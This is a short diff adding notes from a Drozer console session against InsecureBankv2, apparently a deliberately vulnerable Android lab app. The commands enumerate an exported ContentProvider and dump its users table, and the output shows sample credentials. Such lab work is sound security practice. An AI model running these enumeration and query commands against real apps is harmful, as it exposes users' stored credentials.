@@ -1,0 +1,7 @@
+# Drozer console
+drozer console connect
+dz> run app.activity.info -a com.android.insecurebankv2
+dz> run app.provider.info 
+# Found: Exported ContentProvider exposing /users table
+dz> run app.provider.query --provider com.android.insecurebankv2.UsersProvider --table users
+[*] Extracting rows: admin:123456, user1:pass123
